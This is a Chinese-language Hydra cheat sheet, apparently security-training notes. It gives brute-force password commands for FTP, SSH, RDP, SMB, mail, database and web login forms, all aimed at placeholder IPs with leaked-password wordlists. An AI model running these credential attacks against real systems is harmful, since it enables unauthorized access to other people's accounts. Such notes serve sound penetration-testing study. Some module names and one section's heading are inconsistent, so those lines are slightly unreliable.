---
description: 密码爆破
---

# ✔️ Hydra

## 通用格式

1. **hydra \[-l 用户名/-L 用户名列表] \[-p 密码/-P 密码列表] -u -f \[目标IP地址/域名] \[-s 端口号] \[模块] "/login.php:username=^USER^\&password=^PASS^:F=\<form name='login' "**

* \-u：要尝试每一个密码的每一个用户名（遍历用户名列表&密码列表）
* \-f：找到第一个匹配项就立刻停止
* 模块：视具体情况而定
* "/login.php:username=^USER^\&password=^PASS^:F=\<form name='login' "：此处常用于针对Web应用的登录界面的具体规则指定，需要结合BurpSuite以及查看源码来指定

2. **hydra \[-l 用户名/-L 用户名列表] \[-p 密码/-P 密码列表] 协议://目标IP**

## &#x20;单独使用进行爆破

* 长针对于各种协议的服务进行爆破（FTP/SSH/RDP/TELNET/...）

### 针对各种协议的爆破

* **ftp**：用于破解 FTP（File Transfer Protocol）服务：

```bash
hydra -l username -P passwords.txt ftp://192.168.xxx.xx
```

* **ssh**：用于破解 SSH（Secure Shell）服务：

```bash
hydra -l username -P passwords.txt ssh://192.168.xxx.xx
```

* **telnet**：用于破解 Telnet 服务：

```bash
hydra -L usernames.txt -P passwords.txt telnet://192.168.xxx.xx
```

* **sip**：用于破解 SIP 服务器的认证：

```bash
hydra -L usernames.txt -P passwords.txt sip://192.168.xxx.xx
```

* **http-proxy**：用于破解 HTTP 代理服务器的认证：

```bash
hydra -L usernames.txt -P passwords.txt http-proxy://192.168.xxx.xx
```

* **smb**：用于破解 SMB（Server Message Block）服务，常用于 Windows 文件共享：

```bash
hydra -L usernames.txt -P passwords.txt smb://192.168.xxx.xx
```

* **snmp**：用于破解 SNMP（Simple Network Management Protocol）服务：

```bash
hydra -P passwords.txt snmp://192.168.xxx.xx
```

* **rdp**：用于破解 RDP（Remote Desktop Protocol）服务：

```bash
hydra -L usernames.txt -P passwords.txt rdp://192.168.xxx.xx
```

* **smtp**：用于破解 SMTP（Simple Mail Transfer Protocol）服务：

```bash
hydra -L usernames.txt -P passwords.txt smtp://192.168.xxx.xx
```

* **pop3**：用于破解 POP3（Post Office Protocol 3）邮件服务：

```bash
hydra -L usernames.txt -P passwords.txt pop3://192.168.xxx.xx
```

* **imap**：用于破解 IMAP（Internet Message Access Protocol）邮件服务：

```bash
hydra -L usernames.txt -P passwords.txt imap://192.168.xxx.xx
```

* **vnc**：用于破解 VNC（Virtual Network Computing）服务：

```bash
hydra -P passwords.txt vnc://192.168.xxx.xx
```

* **ldap**：用于破解 LDAP（Lightweight Directory Access Protocol）服务：

```bash
hydra -L usernames.txt -P passwords.txt ldap://192.168.xxx.xx
```

* &#x20;**Cisco**：用于破解 Cisco 设备的认证：

```bash
hydra -L usernames.txt -P passwords.txt cisco://192.168.xxx.xx
```

### 针对数据库的爆破

* **mssql**：用于破解 Microsoft SQL Server：

```bash
hydra -L usernames.txt -P passwords.txt mssql://192.168.xxx.xx
```

* **mysql**：用于破解 MySQL 数据库服务：

```bash
hydra -l root -P passwords.txt mysql://192.168.xxx.xx
```

* **redis**：不直接支持 Redis 认证，但可以通过 TCP 协议进行爆破：

```bash
hydra -L usernames.txt -P passwords.txt -s 6379 192.168.xxx.xx redis
```

* **oracle**：用于破解 Oracle 数据库：

```bash
hydra -L usernames.txt -P passwords.txt oracle://192.168.xxx.xx
```

* **mongodb**：可使用Medusa

### 组合使用进行爆破（Hydra + BurpSuite）

* 常针对Web应用程序登录界面的表单进行爆破 (HTTP / HTTPS)

#### **http-form-post**：

* 用于破解基于 HTTP POST 表单的认证。通常用于网站登录页面的暴力破解。

```bash
hydra -L usernames.txt -P passwords.txt 192.168.1.100 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
```

#### **https-form-post**：

* 与 http-form-post 类似，但针对 HTTPS 协议的表单认证。

```bash
hydra -L usernames.txt -P passwords.txt 192.168.1.100 https-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
```

#### **http-form-get**：

* 用于破解基于 HTTP GET 表单的认证。

```bash
hydra -L usernames.txt -P passwords.txt 192.168.1.100 http-form-get "/login?username=^USER^&password=^PASS^:F=incorrect"
```

#### **https-form-get**：

* 与 http-form-get 类似，但针对 HTTPS 协议的表单认证。

```bash
hydra -L usernames.txt -P passwords.txt 192.168.1.100 https-form-get "/login?username=^USER^&password=^PASS^:F=incorrect"
```

#### **https-post-form**：

* 与 http-post-form 类似，但针对 HTTPS 协议：

```bash
hydra -L usernames.txt -P passwords.txt 192.168.1.100 https-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
```

#### **http-post-form**：

* 用于执行更复杂的 HTTP POST 表单暴力破解，常用于需要多步验证或自定义表单参数的情况。

```bash
# 实例
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 192.168.xxx.xx -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

* \`/login.php:username=^USER^\&password=^PASS^\`：此处需要使用BurpSuite拦截表单请求，根据实际情况进行修改
* \`F=\<form name='login' \`：此处需要查看源码中表单实际的名称进行修改
